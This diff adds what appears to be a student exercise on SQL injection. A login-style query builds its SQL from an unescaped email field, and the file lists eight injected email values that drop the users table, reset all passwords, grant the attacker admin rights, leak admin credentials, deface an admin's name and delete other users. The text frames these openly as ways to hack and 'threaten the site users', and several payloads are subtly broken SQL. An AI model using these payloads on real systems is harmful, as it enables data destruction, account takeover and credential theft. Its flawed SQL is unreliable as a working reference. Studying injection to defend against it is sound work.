@@ -1,0 +1,31 @@
+SELECT * FROM users WHERE email = '{$post['email']}'; 
+
+1. Drop the entire users table?
+$post['email'] = cedrick@gmail.com'; DROP TABLE users;
+
+2. Update everyone's password to your password (allowing you to login to anyone's account using your password).
+$post['email'] = cedrick@gmail.com'; UPDATE users SET password = 'mypassword';
+
+3. Update your first_name to be the email and password of all users who is an admin (assume that there is a field 
+in the users table called is_admin where it's 0 if the user is not an admin, or 1 if the user is an admin).  
+This way, when you log out and log back in, instead of saying Welcome [your first_name], it would say Welcome 
+___what ever was stored in first_name field___.
+$post['email'] = cedrick@gmail.com'; UPDATE users SET users.firstname = users.email AND users.password WHERE users.is_admin = 1 AND users.id = 135;	
+
+4. Update your user access so that you now have an admin access.
+$post['email'] = cedrick@gmail.com'; UPDATE users SET users.is_admin = 1 WHERE users.id = 135;
+
+5. Update all the user access of the admin so that they are no longer admin (this way, you are now the only one having admin 
+access and you can threaten the site users).
+$post['email'] = cedrick@gmail.com'; UPDATE users SET users.is_admin = 0 WHERE users.id != 135;
+
+6. Update your first_name to now contain all the field names available in the users table (to see if. there are other sensitive 
+information you can hack).
+$post['email'] = cedrick@gmail.com'; UPDATE users SET users.first_name = (SELECT * FROM users) WHERE users.id = 135;
+
+7. Update the first_name of user id = 1 who is an admin to 'You have been hacked!'.  When this user logs in, instead of saying Welcome [first_name].  
+It would say, "Welcome You have been hacked!".
+$post['email'] = cedrick@gmail.com'; UPDATE users SET users.first_name= 'You have been hacked!' WHERE users.id = 1 AND users.is_admin = 1;
+
+8. Delete all users except yourself.
+$post['email'] = cedrick@gmail.com'; DELETE FROM users WHERE users.id != 135;
